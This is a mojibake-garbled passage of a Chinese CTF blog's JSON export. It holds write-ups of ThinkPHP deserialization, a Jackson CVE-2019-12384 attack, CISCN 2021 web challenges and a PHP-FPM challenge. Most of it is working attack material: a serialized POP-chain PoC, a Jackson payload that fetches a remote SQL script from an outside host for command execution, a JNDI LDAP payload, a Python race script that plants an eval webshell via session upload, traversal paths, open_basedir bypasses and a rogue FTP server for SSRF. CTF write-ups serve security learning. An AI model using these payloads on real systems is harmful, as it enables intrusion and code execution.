$this-&gt;execute($sql, !empty($options[&#x27;fetch_sql&#x27;]) ? true : false); &#125; sqlè¯­å¥æ˜¯$sql = &#39;DELETE FROM &#39; . $table; è¿™é‡Œ$tableæ˜¯å¯æ§å‚æ•° poc.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,concat(0x7e,(select right(flag,16) from test.flag),0x7e),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; 0x03 mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶å¼€å¯ä¸€ä¸ªæ¶æ„æœåŠ¡ç«¯ ä¿®æ”¹mysqlæœåŠ¡å™¨é…ç½®è¿æ¥è¿œç«¯æ¶æ„æœåŠ¡å™¨ å†è¯»ä¸€ä¸‹/flag.sh çœ‹åˆ°flagå­˜åœ¨æ•°æ®åº“ä¸­ï¼Œåœ¨test.flag.flag é€šè¿‡ä¸Šé¢çš„æ–‡ä»¶å†…å®¹ï¼Œå·²ç»å¯ä»¥çŸ¥é“ï¼Œå…¶æœ¬åœ°çš„ mysqlè´¦å·å¯†ç ä¸ºrootï¼Œå°†æ•°æ®åº“é…ç½®æ”¹æˆè¿æ¥å…¶æœ¬åœ°çš„æ•°æ®åº“ æŠ¥é”™æ³¨å…¥ å¯ä»¥å¾—åˆ°éƒ¨åˆ†flag é€šè¿‡å­—ç¬¦ä¸²æˆªå–å¯ä»¥æ‹¿åˆ°åé¢éƒ¨åˆ†","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","slug":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"mysqlæ³¨å…¥","slug":"mysqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"}]},{"title":"Java ååºåˆ—åŒ–","slug":"Java-ååºåˆ—åŒ–","date":"2021-06-22T14:27:53.000Z","updated":"2021-07-18T14:10:37.635Z","comments":true,"path":"2021/06/22/Java-ååºåˆ—åŒ–/","link":"","permalink":"https://123-prog.github.io/2021/06/22/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"Jacksonååºåˆ—åŒ–æ¼æ´#CVE-2019-12384123456Jackson è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å½±å“ç‰ˆæœ¬ï¼šJackson-databind 2.X &lt; 2.9.9.1å¤ç°ç¯å¢ƒï¼šdocker pull tech1iu&#x2F;servlet-with-jackson:2.9.8å¤ç°ç‰ˆæœ¬ï¼šjackson 2.9.8é¶æœºè¿è¡Œï¼šUbuntu18.04 64ä½æ¼æ´ä»‹ç»ï¼šå¼€å¯äº†enableDefaultTyping(),è€Œä¸”é»‘åå•è¿‡æ»¤ä¸å®Œæ•´","text":"Jacksonååºåˆ—åŒ–æ¼æ´#CVE-2019-12384123456Jackson è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å½±å“ç‰ˆæœ¬ï¼šJackson-databind 2.X &lt; 2.9.9.1å¤ç°ç¯å¢ƒï¼šdocker pull tech1iu&#x2F;servlet-with-jackson:2.9.8å¤ç°ç‰ˆæœ¬ï¼šjackson 2.9.8é¶æœºè¿è¡Œï¼šUbuntu18.04 64ä½æ¼æ´ä»‹ç»ï¼šå¼€å¯äº†enableDefaultTyping(),è€Œä¸”é»‘åå•è¿‡æ»¤ä¸å®Œæ•´ ssrf:1poc&#x3D;[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:tcp:&#x2F;&#x2F;xxx:1001&#x2F;hello&quot;&#125;] rce:12345678910//inject.sqlCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; String[] command = &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;CALL SHELLEXEC(&#x27;touch shell.txt&#x27;) //æ‰§è¡Œçš„å‘½ä»¤//poc=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://xxx:1234/inject.sql&#x27;&quot;&#125;] #Spring Jackson1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;xxx:1389&#x2F;iafwnq&quot;&#125;]","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"Javaååºåˆ—åŒ–","slug":"Javaååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ciscn2021 upload","slug":"ciscn2021-upload","date":"2021-06-01T01:35:23.000Z","updated":"2021-09-22T09:55:41.337Z","comments":true,"path":"2021/06/01/ciscn2021-upload/","link":"","permalink":"https://123-prog.github.io/2021/06/01/ciscn2021-upload/","excerpt":"ciscn2021 uploadæºç ","text":"ciscn2021 uploadæºç  12345678910111213141516171819202122232425262728293031&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123; highlight_file(__FILE__); die();&#125;if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123; if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123; die(&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;); &#125; $imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]); if ($imageinfo === FALSE) &#123; die(&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;); &#125; if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123; die(&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;); &#125; $fileName=urldecode($_FILES[&#x27;postedFile&#x27;][&#x27;name&#x27;]); if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123; die(&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;); &#125; $imagePath = &quot;image/&quot; . mb_strtolower($fileName); if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123; echo &quot;upload success, image at $imagePath&quot;; &#125; else &#123; die(&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;); &#125;&#125; éšè—æ–‡ä»¶example.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123; highlight_file(__FILE__); die();&#125;if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123; $zip = new \\ZipArchive(); $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;]; if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123; die(&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;); &#125; if ($zip-&gt;open($name_for_zip) !== TRUE) &#123; die (&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;); &#125; echo &quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;; $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); $zip-&gt;extractTo($pos_for_zip); $zip-&gt;close(); unlink($name_for_zip); $files = glob(&quot;$pos_for_zip/*&quot;); foreach($files as $file)&#123; if (is_dir($file)) &#123; continue; &#125; $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]); if ($second !== FALSE) &#123; $final_name = pathinfo($file)[&quot;basename&quot;]; imagepng($second, &#x27;example/&#x27;.$final_name); imagedestroy($second); &#125; imagedestroy($first); unlink($file); &#125;&#125; å¤§æ¦‚çš„åŠŸèƒ½æ˜¯åœ¨index.phpå¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨example.phpå¤„å¯ä»¥è§£å‹zipæ–‡ä»¶ï¼Œè€Œä¸”è·¯å¾„å…¨éƒ¨å¯çŸ¥ æ‰€ä»¥æ€è·¯æ˜¯ åœ¨index.phpå¤„ä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œå†åˆ©ç”¨example.phpè§£å‹å‹ç¼©åŒ…ï¼Œå°†å‹ç¼©åŒ…é‡Œçš„æ¶æ„æ–‡ä»¶æ”¾åœ¨æŒ‡å®šè·¯å¾„ï¼Œå› ä¸ºè¿™é‡Œå¯¹å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶æœ‰ä¸€äº›å›¾ç‰‡å¤„ç†ï¼Œå¦‚æœä¸æ˜¯å›¾ç‰‡è¿‡ä¸äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ”¹ä¸€ä¸‹åç¼€å°±å¯ä»¥ ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ”¹åç¼€ä¸ºphpï¼Œå‹ç¼©æˆzip ä¸Šä¼ zipæ–‡ä»¶ ç”±äºå¯¹ä¸Šä¼ æ–‡ä»¶åç¼€åæœ‰è¿‡æ»¤ï¼Œä½†æ³¨æ„åˆ°åé¢çš„mb_strtolower()ï¼Œå¯ä»¥ç”¨ä¸€äº›Unicodeå­—ç¬¦ä»£æ›¿ è¿™é‡Œç”¨Ä°(%c4%b0)ç»•è¿‡å¯¹içš„è¿‡æ»¤ getimagesize()ç»•è¿‡ï¼š 12#define width 1#define height 1 ç„¶åå†åˆ©ç”¨example.phpå¯¹1.zipè¿›è¡Œè§£å‹ æœ€åç›´æ¥è®¿é—®example/1.phpæ‹¿åˆ°shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"CTF/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"getimagesizeç»•è¿‡","slug":"getimagesizeç»•è¿‡","permalink":"https://123-prog.github.io/tags/getimagesize%E7%BB%95%E8%BF%87/"},{"name":"mb_strtolower()çš„åˆ©ç”¨","slug":"mb-strtolower-çš„åˆ©ç”¨","permalink":"https://123-prog.github.io/tags/mb-strtolower-%E7%9A%84%E5%88%A9%E7%94%A8/"}]},{"title":"CISCN 2021 web éƒ¨åˆ†wp","slug":"CISCN2021-webéƒ¨åˆ†wp","date":"2021-05-18T14:26:06.000Z","updated":"2021-09-22T09:55:00.391Z","comments":true,"path":"2021/05/18/CISCN2021-webéƒ¨åˆ†wp/","link":"","permalink":"https://123-prog.github.io/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/","excerpt":"0x01 easy_sql","text":"0x01 easy_sql æŠ¥é”™æ³¨å…¥ï¼Œè¿‡æ»¤äº†informationï¼Œsysï¼Œinnodbï¼Œunionç­‰ç­‰ 1uname&#x3D;&#39;) and polygon(id)# æŠ¥é”™å¾—åˆ°æ•°æ®åº“åå’Œusersè¡¨ï¼Œä½†flagæ²¡åœ¨usersè¡¨ï¼Œè¿™é‡Œç›²çŒœæœ‰ä¸ªflagè¡¨ åˆ©ç”¨ä¸¤ä¸ªè¡¨è¿æ¥ä¸èƒ½å‡ºç°åŒåå­—æ®µè¿›è¡ŒæŠ¥é”™çˆ†å‡ºflagçš„å­—æ®µå 123uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b) as c)# uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id)) as c)#uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id,no)) as c)# å¾—åˆ°flagè¡¨å­—æ®µ id,no,851c91cb-b14d-49b2-8feb-4764c1c2b855 æœ€åpaload 1uname&#x3D;&#39;) and updatexml(1,(select &#96;851c91cb-b14d-49b2-8feb-4764c1c2b855&#96; from flag),1)# è¿™é¢˜ä¹Ÿå¯ä»¥å¸ƒå°”ç›²æ³¨ï¼Œä½†æ³¨æ„æ•°æ®åº“çš„å­—ç¬¦æ¯”è¾ƒä¸åŒºåˆ†å¤§å°å†™ï¼Œè¦æƒ³åŒºåˆ†å¤§å°å†™çš„æ¯”è¾ƒï¼Œæœ‰ä¸¤ç§æ–¹æ³• 1.binary() 1234567mysql&gt; select (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;);+-----------------------------------+| (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;) |+-----------------------------------+| 0 |+-----------------------------------+1 row in set (0.00 sec) 2.æ‹¼æ¥jsonå­—ç¬¦ 1234567mysql&gt; select (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a&#39;);+----------------------------------------------------+| (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a0&#39;) |+----------------------------------------------------+| 0 |+----------------------------------------------------+1 row in set (0.00 sec) 0x02 easy_sourceæºç æ³„éœ².index.php.swo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114æœ¬é¢˜ç›®æ²¡æœ‰å…¶ä»–ä»£ç äº†å™¢ï¼Œå°±åªæœ‰è¿™ä¸€ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶ä½ çœ‹åˆ°çš„ä¸å®Œå…¨ï¼Œä½†æ˜¯ä½ è§‰å¾—æˆ‘ä¼šæŠŠflagè—åœ¨å“ªé‡Œå‘¢ï¼Œä»”ç»†æƒ³æƒ³æ–‡ä»¶é‡Œé¢è¿˜æœ‰ä»€ä¹ˆï¼Ÿ&lt;?phpclass User&#123; private static $c = 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125; &#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); åªæœ‰è¿™ä¸ªæºç ï¼Œæ ¹æ®æç¤ºï¼Œæºç å¯èƒ½è—åœ¨ä¸Šé¢é‚£äº›å‡½æ•°çš„æ³¨é‡Šé‡Œé¢ï¼Œåˆ©ç”¨phpçš„å†…ç½®ç±»ReflectionMethodè¯»å–Userç±»ä¸­å‡½æ•°çš„æ³¨é‡Š 1?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;a&amp;rd&#x3D;getDocComment çˆ†ç ´rbå€¼ï¼Œæœ€ååœ¨å‡½æ•°qä¸­æ‰¾åˆ°flagæ³¨é‡Š payload: 1?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment 0x03 middle_sourceéšè—ç›®å½•./listing è®¿é—®æ‹¿åˆ°you_can_seeeeeeee_me.phpï¼Œå‘ç°æ˜¯ä¸€ä¸ªphpinfo å…¶ä¸­å¯ä»¥æ‹¿åˆ°sessionçš„å­˜æ”¾ä½ç½®var/lib/php/sessions/caaceaafdfï¼Œè€Œä¸”sessionçš„æ–‡ä»¶åå¯æ§ï¼Œå¯ä»¥ç»“åˆsessionæ–‡ä»¶åŒ…å«æ‹¿åˆ°shell 12345678910111213141516171819202122232425262728#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;cat&#x27;data = &#123; &quot;cmd&quot;:&quot;echo &#x27;nappingCat&#x27;;var_dump(scandir(&#x27;/etc&#x27;));&quot;, &quot;field&quot;:&quot;xx&quot;, &quot;cf&quot;:&#x27;../../../../../var/lib/php/sessions/caaceaafdf/sess_&#x27;+sessid &#125;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post( &#x27;http://124.70.16.213:23295/index.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(&#x27;http://124.70.16.213:23295/index.php&#x27;,data=data) if &#x27;nappingCat&#x27; in resp.text: print(resp.text) event.clear() else: print(&quot;retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: threading.Thread(target=write,args=(session,)).start() threading.Thread(target=read,args=(session,)).start() event.set() ç›´æ¥æ‰«etcç›®å½•ï¼Œæ‰¾åˆ°é‚£ä¸ªå¥‡æ€ªçš„æ–‡ä»¶å¤¹ï¼Œå†å¾€é‡Œæ‰«ï¼Œæœ€åå¾—åˆ°è·¯å¾„ 1&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g payload: 1cf &#x3D; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"CISCN","slug":"CISCN","permalink":"https://123-prog.github.io/tags/CISCN/"}]},{"title":"è“å¸½æ¯-One Pointer PHP","slug":"è“å¸½æ¯-One-Pointer-PHP","date":"2021-05-05T14:26:06.000Z","updated":"2021-09-22T10:16:10.188Z","comments":true,"path":"2021/05/05/è“å¸½æ¯-One-Pointer-PHP/","link":"","permalink":"https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/","excerpt":"0x01 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å®ç°phpä»»æ„ä»£ç æ‰§è¡Œæºç ï¼š","text":"0x01 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å®ç°phpä»»æ„ä»£ç æ‰§è¡Œæºç ï¼š 1234567891011121314151617//add_api.php&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123; $count[++$user-&gt;count]=1; if($count[]=1)&#123; $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); &#125;else&#123; eval($_GET[&quot;backdoor&quot;]); &#125;&#125;else&#123; $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));&#125;?&gt; 123456//user.php&lt;?phpclass User&#123; public $count;&#125;?&gt; éœ€è¦æ»¡è¶³$count[]=1ä¸ºfalseï¼Œåˆ©ç”¨æ•´æ•°æº¢å‡ºï¼Œ64ä½æ•´æ•°æœ€å¤§å€¼ä¸º9223372036854775807,ä»¤$user-&gt;countä¸º9223372036854775806å³å¯ç»•è¿‡ 12&#x2F;&#x2F;payloadO:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125; æŠ“åŒ…ä¿®æ”¹cookieä¸­çš„dataå€¼ä¸ºä¸Šé¢payloadï¼Œåœ¨backdoorå‚æ•°ä¸­å³å¯å®ç°phpä»»æ„ä»£ç æ‰§è¡Œ ç¦ç”¨äº†å‘½ä»¤æ‰§è¡Œçš„å‡½æ•° è®¾ç½®äº†open_basedir 0x02 ç»•è¿‡disable_functionså®ç°å‘½ä»¤æ‰§è¡Œåˆ©ç”¨chdirå’Œini_setå‡½æ•°å¯ä»¥ç»•è¿‡open_basedirçš„é™åˆ¶ 1mkdir(&#x27;css&#x27;);chdir(&#x27;css&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;)); åœ¨æ ¹ç›®å½•å‘ç°flagæ–‡ä»¶ ä½†ä½¿ç”¨file_get_contentsè¯»ä¸äº†ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯è®¾ç½®äº†æƒé™ï¼Œå¯èƒ½éœ€è¦ææƒï¼Œé¦–å…ˆå¾—ç»•è¿‡disable_functionså®ç°å‘½ä»¤æ‰§è¡Œæ‹¿åˆ°shell è¯»ä¸€ä¸‹/proc/self/ä¸‹å½“å‰è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸ªphp-fpmï¼Œé‚£ä¹ˆææœ‰å¯èƒ½æ˜¯æ”»å‡»php-fpmæ‹¿shell 1?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;proc&#x2F;self&#39;));var_dump(file_get_contents(&#39;&#x2F;proc&#x2F;self&#x2F;cmdline&#39;)); æ‰¾php-fpmçš„é…ç½®æ–‡ä»¶ 1?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#39;));var_dump(file_get_contents(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf&#39;)); å¯ä»¥çœ‹åˆ°php-fpmæœåŠ¡ç»‘å®šçš„ç«¯å£å·æ˜¯9001 çŸ¥é“ç«¯å£å·ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹æ”»å‡»php-fpmæ‹¿shellï¼Œé¦–å…ˆæƒ³åˆ°åˆ©ç”¨gopheråè®®ï¼Œä½†é€šè¿‡phpinfoçœ‹å¥½åƒæ²¡æœ‰å®‰è£…curlæ¨¡å—ï¼Œfile_get_contentsé€ æˆçš„SSRFå¥½åƒåªèƒ½é€šè¿‡GETè·å–æ•°æ®ï¼Œæ‰€ä»¥çœ‹èµ·æ¥ä¸€åˆ‡éƒ½å¥½åƒä¸å¯è¡Œï¼Œè¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ftpæ¥è½¬å‘æ¶æ„çš„payload æœä¸€ä¸‹ftpæœåŠ¡å™¨ç«¯è„šæœ¬ï¼Œå¹¶è¿è¡Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Š 1234567891011121314151617181920212223242526272829import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #åˆ›å»ºtcp sockets.bind((&#x27;0.0.0.0&#x27;,23)) s.listen(1) conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() åˆ©ç”¨ftpçš„è¢«åŠ¨æ¨¡å¼ï¼Œå½“å®¢æˆ·ç«¯æœ‰è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨å°†æŒ‡å®šipä¸ç«¯å£è®©å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥å¹¶ä¼ è¾“æ•°æ®ï¼Œè¿™é‡ŒæŒ‡å®š127.0.0.1:9001ï¼Œå°±æ˜¯è®©å®¢æˆ·ç«¯å°†æ•°æ®å‘é€åˆ°ç¯å›9001ç«¯å£ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦æ”»å‡»çš„php-fpmç«¯å£ï¼› ç„¶ååˆ©ç”¨file_put_contents()è®¿é—®æˆ‘ä»¬æ­å»ºçš„ftpæœåŠ¡å¹¶å°†æ¶æ„æ•°æ®ä¼ è¾“åˆ°è‡ªèº«çš„9001ç«¯å£å®ç°ä¸php-fpmäº¤äº’ æ¥ä¸‹æ¥æ„é€ æ¶æ„æ•°æ® é€šå¸¸æƒ…å†µä¸‹æ”»å‡»php-fpmä¼šæ„é€ auto_prepend_file ä¸º php://input ä¸” allow_url_include = Onå®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼Œä½†è¿™ç§æ–¹å¼ä¼šå—åˆ°disable_functioné™åˆ¶ï¼ˆè™½è¯´PHP-FPM çš„ä¸¤ä¸ªç¯å¢ƒå˜é‡: PHP_VALUE å’Œ PHP_ADMIN_VALUEå¯ä»¥ä¿®æ”¹phpçš„é…ç½®ï¼Œä½†ååé™¤äº†disable_functioné™¤å¤–ï¼Œæ”¹ä¸äº† è¦ç»•è¿‡disable_functionï¼Œå¯ä»¥é€šè¿‡åŠ è½½æ¶æ„.soæ‰©å±•å®ç°ï¼ˆphpè‡ªå®šä¹‰æ¶æ„æ‰©å±•soç¼–å†™è¿‡ç¨‹ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)ï¼‰ ç¼–å†™ä¸€ä¸ªæ‰©å±• 12345678#define 